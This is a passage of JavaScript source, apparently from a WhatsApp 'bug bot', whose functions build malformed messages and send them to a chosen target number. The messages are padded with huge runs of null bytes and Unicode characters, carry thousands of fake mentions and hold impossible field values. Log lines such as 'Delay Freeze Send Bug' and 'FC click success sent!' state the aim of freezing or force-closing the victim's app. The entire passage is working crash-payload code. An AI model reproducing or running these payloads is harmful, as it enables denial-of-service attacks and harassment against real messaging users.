                  buttonParamsJson: `{\"catalog_id\":\"999999999999999\",\"product_retailer_id\":null,\"text\":\"Come On\",\"thumbnail_product_image\":\"https://files.catbox.moe/ebag6l.jpg\",\"product_sections\":[{\"title\":false,\"products\":[{\"id\":12345,\"name\":null,\"price\":\"free\",\"currency\":null,\"image\":false,\"description\":\"Order Now\"}]}],\"cta\":{\"type\":\"VIEW_CATALOG\",\"display_text\":123},\"business_info\":{\"name\":999999999,\"phone_number\":true,\"address\":[]},\"footer_text\":0${"\u0000".repeat(100000)}}`
                }
              ]
            }
          }
        }
      }
    }),
    {
      message: {
        orderMessage: {
          orderId: "92828",
          thumbnail: null,
          itemCount: 9999999999999,
          status: "INQUIRY",
          surface: "CATALOG",
          message: "Order Now",
          orderTitle: "Click Here",
          sellerJid: target,
          token: "8282882828==",
          totalAmount1000: "828828292727372728829",
          totalCurrencyCode: "IDR",
          messageVersion: 1,
          contextInfo: {
            mentionedJid: [
              target,
              ...Array.from(
                { length: 30000 },
                () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              )
            ],
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true
          }
        },
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        }
      },
      ephemeralExpiration: 0,
      forwardingScore: 9999,
      isForwarded: false,
      font: Math.floor(Math.random() * 9),
      background: "#" +
        Math.floor(Math.random() * 16777215)
          .toString(16)
          .padStart(6, "0")
    }
  );

  await sock.relayMessage(
    "status@broadcast",
    ConnectMsg.message.viewOnceMessage.message,
    {
      messageId: ConnectMsg.key?.id || "",
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target }
                }
              ]
            }
          ]
        }
      ]
    }
  );
  if (mention) {
    await sock.relayMessage(
      target,
      {
        groupStatusMentionMessageV2: {
          message: {
            protocolMessage: {
              key: ConnectMsg.key,
              type: 25
            }
          }
        }
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: true }
          }
        ]
      }
    );
  }

  console.log(chalk.red(`OVALIUM DELAY ${target}`));
}

async function Blankxdelay(sock, target) {
  const MentionedJidMsg = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
        },
        interactiveMessage: {
          contextInfo: {
            stanzaId: sock.generateMessageTag(),
            participant: "0@s.whatsapp.net",
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                fileLength: "9999999999999",
                pageCount: 3567587327,
                mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                fileName: "Gw Rizz Bang‌",
                fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1735456100",
                contactVcard: true,
                caption: "",
              },
            },
          },
          body: {
            text: " " + "ꦽ".repeat(100000),
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "𑜦𑜠".repeat(10000),
                  id: null
                })
              },
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "𑜦𑜠".repeat(10000),
                  id: null
                })
              },
              {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                  display_text: "𑜦𑜠".repeat(10000),
                  url: "https://" + "𑜦𑜠".repeat(10000) + ".com"
                })
              },
              {
                name: "cta_copy",
                buttonParamsJson: JSON.stringify({
                  display_text: "𑜦𑜠".repeat(10000),
                  copy_code: "𑜦𑜠".repeat(10000)
                })
              },
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  icon: "PROMOTION",
                  flow_cta: "PAYMENT_PROMOTION",
                  flow_message_version: "3"
                })
              }
            ],
          },
        },
      },
    },
  };
  await sock.relayMessage(target, MentionedJidMsg, {
    messageId: sock.generateMessageTag(),
    participant: { jid: target }
  });
  await sock.relayMessage(
    "status@broadcast",
    MentionedJidMsg,
    {
      messageId: sock.generateMessageTag(),
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target } }
              ]
            }
          ]
        }
      ]
    }
  );
}

async function BlankMention(sock, target) {
  const MentionedJidMsg = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
        },
        interactiveMessage: {
          contextInfo: {
            stanzaId: sock.generateMessageTag(),
            participant: "0@s.whatsapp.net",
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                fileLength: "9999999999999",
                pageCount: 3567587327,
                mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                fileName: "Reflead",
                fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1735456100",
                contactVcard: true,
                caption: "",
              },
            },
          },
          body: {
            text: "CTA" + "ꦽ".repeat(100000),
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "𑜦𑜠".repeat(10000),
                  id: null
                })
              },
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "𑜦𑜠".repeat(10000),
                  id: null
                })
              },
              {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                  display_text: "𑜦𑜠".repeat(10000),
                  url: "https://" + "𑜦𑜠".repeat(10000) + ".com"
                })
              },
              {
                name: "cta_copy",
                buttonParamsJson: JSON.stringify({
                  display_text: "𑜦𑜠".repeat(10000),
                  copy_code: "𑜦𑜠".repeat(10000)
                })
              },
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  icon: "PROMOTION",
                  flow_cta: "PAYMENT_PROMOTION",
                  flow_message_version: "3"
                })
              }
            ],
          },
        },
      },
    },
  };
  await sock.relayMessage(
    "status@broadcast",
    MentionedJidMsg,
    {
      messageId: sock.generateMessageTag(),
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target } }
              ]
            }
          ]
        }
      ]
    }
  );
}

async function iosInvible(sock, target) {
  try {

    const msg = generateWAMessageFromContent(
      target,
      {
        interactiveResponseMessage: {
          contextInfo: {
            mentionedJid: Array.from(
              { length: 1900 },
              (_, y) => `1313555000${y + 1}@s.whatsapp.net`
            )
          },
          body: {
            text: "AMPASSSS" + "𑇂𑆵𑆴𑆿".repeat(500),
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "{}",
            version: 3
          }
        }
      },
      { userJid: target }
    );

    await sock.relayMessage(
      "status@broadcast",
      msg.message,
      {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target }
                  }
                ]
              }
            ]
          }
        ]
      }
    );

  } catch (err) {
    console.error("Error yatom:", err);
  }
}


async function Focav(sock, target) {
    const Msg = generateWAMessageFromContent(target, {
        extendedTextMessage: {
            text: "<" + "ꦽ".repeat(9999),
            matchedText: "https://Wa.me/stickerpack/1",
            canonicalUrl: "https://Wa.me/stickerpack/1",
            description: "Boombogie",
            title: ".",
            previewType: 0,
            jpegThumbnail: Buffer.alloc(0),
            contextInfo: {
                mentionedJid: [
                    target,
                    ...Array.from({ length: 50 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
                ],
                remoteJid: "X",
                participant: target,
                stanzaId: "1234567890ABCDEF",
                quotedMessage: {
                    paymentInviteMessage: {
                        serviceType: 3,
                        expiryTimestamp: Date.now() + 1814400000
                    }
                },
                externalAdReply: {
                    title: "Send Now",
                    body: "Join Now",
                    thumbnailUrl: "https://Wa.me/stickerpack/1",
                    mediaType: 1,
                    renderLargerThumbnail: false,
                    sourceUrl: "https://Wa.me/stickerpack/1"
                }
            }
        }
    }, {});

    await sock.relayMessage(target, Msg.message, { participant: { jid: target }, messageId: Msg.key.id });
    console.log(chalk.red(`Delay Freeze Send Bug ${target}`));
}

async function PaymentMethode(sock, target) {
  try {
    const interactive = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "✿",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.035,
                degreesLongitude: 922.999999999999,
                name: "✿",
                address: "\u200D",
              },
            },
            body: {
              text: "✿",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(100000),
              buttons: [
                {
                  name: "payment_method",
                  buttonParamsJson: JSON.stringify({
                    reference_id: null,
                    payment_method: "\u0010".repeat(0x2710),
                    payment_timestamp: null,
                    share_payment_status: true
                  }),
                },
              ],
            },

            disappearingMode: {
              initiator: "INITIATED_BY_OTHER",
              trigger: "ACCOUNT_SETTING",
            },

            contextInfo: {
            stanzaid: "1234567890ABCDEF",
              participant: target,
              mentionedJid: ["1@s.whatsapp.net"],
            },
          },
        },
      },
    };

    await sock.relayMessage(
      target,
      { message: interactive },
      { userJid: target }
    );

    console.log("FC click success sent!");
  } catch (err) {
    console.log("Error:", err);
  }
}

async function Ghostluc(target) {
let msg = generateWAMessageFromContent(target, {
    interactiveResponseMessage: {
      contextInfo: {
        mentionedJid: Array.from({ length:2000 }, (_, y) => `1313555000${y + 1}@s.whatsapp.net`)
      }, 
      body: {
        text: "Lulc",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "address_message",
        paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"Yd7\",\"tower_number\":\"Y7d\",\"city\":\"chindo\",\"name\":\"d7y\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(900000)}\"}}`,
        version: 3
      }
    }
  }, { userJid:target });

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target, "13135550002@s.whatsapp.net"],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
}

async function CzFrozen(sock, target) {
  await sock.relayMessage(target, {
    viewOnceMessage: {
      message: {
        buttonsMessage: {
          text: "[Xyz]",
          contentText: "Kamu Suka Permen?" + "ꦽ".repeat(7000),
          contextInfo: {
            forwardingScore: 6,
            isForwarded: true,
              urlTrackingMap: {
                urlTrackingMapElements: [
                  {
                    originalUrl: "https://t.me/xatanicvxii",
                    unconsentedUsersUrl: "https://t.me/xatanicvxii",
                    consentedUsersUrl: "https://wa.me/1$",
                    cardIndex: 1,
                  },
                  {
                    originalUrl: "https://wa.me/1$",
                    unconsentedUsersUrl: "https://wa.me/stickerPack",
                    consentedUsersUrl: "https://wa.me/stickerPack",
                    cardIndex: 2,
                  },
                ],
              },            
            quotedMessage: {
              interactiveResponseMessage: {
                body: {
                  text: "Join Now",
                  format: ".groupmenu"
                },
                nativeFlowResponseMessage: {
                  name: "address_message",
                  paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\".menu\",\"tower_number\":\".menu\",\"city\":\"NewYork\",\"name\":\"fucker\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"X${"\u0000".repeat(900000)}\"}}`,
                  version: 3
                }
              }
            }
          },
          headerType: 1
        }
      }
    }
  }, {});
}

async function BronzeBread(target) {
    try {
        const buttonparams = await generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: { text: "⟅༑", format: "BOLD" },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: "\x10".repeat(1045000),
                            version: 3
                        },
                        entryPointConversionSource: "call_permission_message"
                    }
                }
            }
        }, {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0")
        });

        const buttonjson = await generateWAMessageFromContent(target, {
            interactiveResponseMessage: {
                body: { text: "Permen Lolipop" + "𑆿𑆴𑆿".repeat(6000) },
                nativeFlowResponseMessage: {
                    name: "button_reply",
                    paramsJson: JSON.stringify({ id: "option_a" })
                }
            }
        }, {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0")
        });
        for (const msg of [buttonparams, buttonjson]) {
            await sock.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [{
                    tag: "meta",
                    attrs: {},
                    content: [{
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{ tag: "to", attrs: { jid: target } }]
                    }]
                }]
            });
        }
        const ButtonMsg = {
            viewOnceMessage: {
                message: {
                    stickerMessage: {
                        url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
                        fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
                        fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
                        mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
                        mimetype: "application/was",
                        height: 9999999999,
                        width: 999999999,
                        directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
                        fileLength: 9999999,
                        pngThumbnail: Buffer.alloc(0),
                        mediaKeyTimestamp: 1757601173,
                        isAnimated: true
                    }
                }
            }
        };
        await sock.relayMessage(target, ButtonMsg.viewOnceMessage.message, {
            messageId: "",
            participant: { jid: target },
            userJid: target
        });

        const PaymentMsg2 = await generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: { text: "Bro", format: "DEFAULT" },
                        nativeFlowResponseMessage: {
                            name: "payment_info",
                            paramsJson: "\u0000".repeat(1045000),
                            version: 3
                        },
                        entryPointConversionSource: "galaxy_message"
                    }
                }
            }
        }, {
            ephemeralExpiration: 0,
            forwardingScore: 0,
            isForwarded: false,
            font: Math.floor(Math.random() * 9),
            background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0")
        });
        await sock.relayMessage("status@broadcast", PaymentMsg2.message, {
            messageId: PaymentMsg2.key.id,
            statusJidList: [target],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                }]
            }]
        });
        if (PaymentMsg2) {
            await sock.relayMessage(target, {
                groupStatusMentionMessageV2: { message: { protocolMessage: { key: PaymentMsg2.key, type: 25 } } }
            }, {});
        }

    } catch (e) {
        console.error(e);
    }
}

async function sockAyunBeloved(sock, target, mention) {

  let biji2 = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: " 驴sock Here驴 ",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\x10".repeat(1045000),
              version: 3,
            },
            entryPointConversionSource: "call_permission_request",
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background:
        "#" +
        Math.floor(Math.random() * 16777215)
          .toString(16)
          .padStart(6, "99999999"),
    }
  );
 
  const mediaData = [
    {
      ID: "68917910",
      uri: "t62.43144-24/10000000_2203140470115547_947412155165083119_n.enc?ccb=11-4&oh",
      buffer: "11-4&oh=01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe",
      sid: "5e03e0",
      SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
      ENCSHA256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
      mkey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
    },
    {
      ID: "68884987",
      uri: "t62.43144-24/10000000_1648989633156952_6928904571153366702_n.enc?ccb=11-4&oh",
      buffer: "B01_Q5Aa1wH1Czc4Vs-HWTWs_i_qwatthPXFNmvjvHEYeFx5Qvj34g&oe",
      sid: "5e03e0",
      SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
      ENCSHA256: "25fgJU2dia2Hhmtv1orOO+9KPyUTlBNgIEnN9Aa3rOQ=",
      mkey: "lAMruqUomyoX4O5MXLgZ6P8T523qfx+l0JsMpBGKyJc=",
    },
  ]

  let sequentialIndex = 0
  console.log(chalk.red(`饾槹饾樀饾槩饾樄 饾槾饾槮饾槬饾槩饾槸饾槰 饾槷饾槮饾槸饾槰饾槳饾槼饾槳饾槷 饾槩饾樀饾樀饾槩饾槫饾槵 饾槵饾槮 ${target}`))

  const selectedMedia = mediaData[sequentialIndex]
  sequentialIndex = (sequentialIndex + 1) % mediaData.length
  const { ID, uri, buffer, sid, SHA256, ENCSHA256, mkey } = selectedMedia

  const contextInfo = {
    participant: target,
    mentionedJid: [
      target,
      ...Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
    ],
  }

  const stickerMsg = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/${uri}=${buffer}=${ID}&_nc_sid=${sid}&mms3=true`,
          fileSha256: SHA256,
          fileEncSha256: ENCSHA256,
          mediaKey: mkey,
          mimetype: "image/webp",
          directPath: `/v/${uri}=${buffer}=${ID}&_nc_sid=${sid}`,
          fileLength: { low: Math.floor(Math.random() * 1000), high: 0, unsigned: true },
          mediaKeyTimestamp: { low: Math.floor(Math.random() * 1700000000), high: 0, unsigned: false },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo,
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  }

  const textMsg = {
    extendedTextMessage: {
      text: "Hi Im sock?驴" + "軎�".repeat(300000),
      contextInfo,
    },
  }

  const interMsg = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "蟽骗伪讗 搔伪喙€", format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1045000),
            version: 3,
          },
          entryPointConversionSource: "galaxy_message",
        },
      },
    },
  }

  const statusMessages = [stickerMsg, textMsg, interMsg]
 
  const musicMeta = {
  musicContentMediaId: "589608164114571",
  songId: "870166291800508",
  author: "慰蟿伪习 喂褧 薪褦褟褦",
  title: "薪伪喂 喂屑 慰蟿伪习",
  artworkDirectPath:
    "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
  artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
  artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
  artistAttribution: "https://www.instagram.com/Otapengenkawin",
  countryBlocklist: true,
  isExplicit: true,
  artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU=",
};

const videoMessage = {
  url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
  mimetype: "video/mp4",
  fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
  fileLength: "289511",
  seconds: 15,
  mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
  caption: "跃缘怨諆 諊跃諓e",
  height: 640,
  width: 640,
  contextInfo: {
    mentionedJid: Array.from(
      { length: 1900 },
      () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
    ),
  },
  annotations: [
    { embeddedContent: { embeddedMusic: musicMeta }, embeddedAction: true },
  ],
};

const stickMessage = {
  stickerMessage: {
    url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
    fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
    mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
    mimetype: "image/webp",
    isAnimated: true,
    contextInfo: {
      mentionedJid: Array.from(
        { length: 2000 },
        () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
      ),
    },
  },
};

const nativeMessage = {
  interactiveResponseMessage: {
    body: { text: "喙弔喔勛� 蟼喙徯逞�", format: "DEFAULT" },
    nativeFlowResponseMessage: {
      name: "galaxy_message",
      paramsJson: "\u0000".repeat(1045000),
      version: 3,
    },
    entryPointConversionSource: "{}",
  },
  contextInfo: {
    participant: target,
    mentionedJid: Array.from(
      { length: 2000 },
      () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
    ),
    quotedMessage: {
      paymentInviteMessage: {
        serviceType: 3,
        expiryTimestamp: Date.now() + 1814400000,
      },
    },
  },
};


const generateMessage = {
        viewOnceMessage: {
            message: {
                audioMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0&mms3=true",
                    mimetype: "audio/mpeg",
                    fileSha256: Buffer.from([
            226, 213, 217, 102, 205, 126, 232, 145,
            0,  70, 137,  73, 190, 145,   0,  44,
            165, 102, 153, 233, 111, 114,  69,  10,
            55,  61, 186, 131, 245, 153,  93, 211
        ]),
        fileLength: 432722,
                    seconds: 26,
                    ptt: false,
                    mediaKey: Buffer.from([
            182, 141, 235, 167, 91, 254,  75, 254,
            190, 229,  25,  16, 78,  48,  98, 117,
            42,  71,  65, 199, 10, 164,  16,  57,
            189, 229,  54,  93, 69,   6, 212, 145
        ]),
        fileEncSha256: Buffer.from([
            29,  27, 247, 158, 114,  50, 140,  73,
            40, 108,  77, 206,   2,  12,  84, 131,
            54,  42,  63,  11,  46, 208, 136, 131,
            224,  87,  18, 220, 254, 211,  83, 153
        ]),
                    directPath: "/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0",
                    mediaKeyTimestamp: 1746275400,
                    contextInfo: {
                        mentionedJid: Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const sockmsg = generateWAMessageFromContent(target, generateMessage, {});

   
  const messages = [
  { viewOnceMessage: { message: { videoMessage } } },
  { viewOnceMessage: { message: stickMessage } },
  { viewOnceMessage: { message: nativeMessage } },
  { viewOnceMessage: { message: { musicMeta } } },
];

  let msg = null;
  for (let i = 0; i < 100; i++) {
  await sock.relayMessage("status@broadcast", sockmsg.message, {
        messageId: sockmsg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });    
    await sock.relayMessage("status@broadcast", biji2.message, {
      messageId: biji2.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: []
                }
              ]
            }
          ]
        }
      ]
    });  
     for (const content of statusMessages) {
      const msg = generateWAMessageFromContent(target, content, {})
      await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }],
              },
            ],
          },
        ],
      })
    }
    for (const item of messages) {
      msg = generateWAMessageFromContent(target, item, {});
      await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target },
                    content: undefined,
                  },
                ],
              },
            ],
          },
        ],
      });
    }
        
    if (i < 99) {
    await new Promise(resolve => setTimeout(resolve, 5000));
  }
  }
  if (mention) {
    await sock.relayMessage(
      target,
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: {
              is_status_mention: " meki - melar ",
            },
            content: undefined,
          },
        ],
      }
    );
  }
}

async function MediaBlast(target) {
  try {
    const stickerMsg = {
      viewOnceMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
            mimetype: "image/webp",
            directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc",
            fileLength: { low: 1, high: 0, unsigned: true },
            mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
            firstFrameLength: 19904,
            firstFrameSidecar: "KN4kQ5pyABRAgA==",
            isAnimated: true,
            contextInfo: {
              mentionedJid: [
                "1@s.whatsapp.net",
                ...Array.from({ length: 2000 }, () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                ),
              ],
              groupMentions: [],
              entryPointConversionSource: "non_contact",
              entryPointConversionApp: "whatsapp",
              entryPointConversionDelaySeconds: 467593,
            },
            stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
